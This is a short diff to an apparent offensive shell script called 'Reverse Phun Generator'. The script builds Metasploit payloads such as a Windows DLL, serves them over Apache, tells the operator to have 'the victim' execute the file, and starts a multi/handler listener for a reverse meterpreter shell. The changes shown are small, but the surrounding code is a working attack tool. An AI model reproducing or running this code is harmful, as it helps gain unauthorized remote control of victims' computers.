@@ -87,7 +87,7 @@ case $type in
  
  'D')
  type_payload="windows"
- extension="dll"
+ extension="dll"    
   format="D"
  ;;
  
@@ -137,9 +137,9 @@ esac
   success "Apache server started"
   info "Execute the [${BOLD}${YELLOW}filename.$extension${RESET}] to the victim"
   info "Launching multihandler"
+  success "Apache server stopped"
   $MSFCLI multi/handler PAYLOAD=$type_payload/meterpreter/$stage LHOST=$attacker LPORT=$port E
-
-
+  /etc/init.d/apache2 stop
   end=`date`
  clear
 success "Reverse Phun Generator.[$end]"
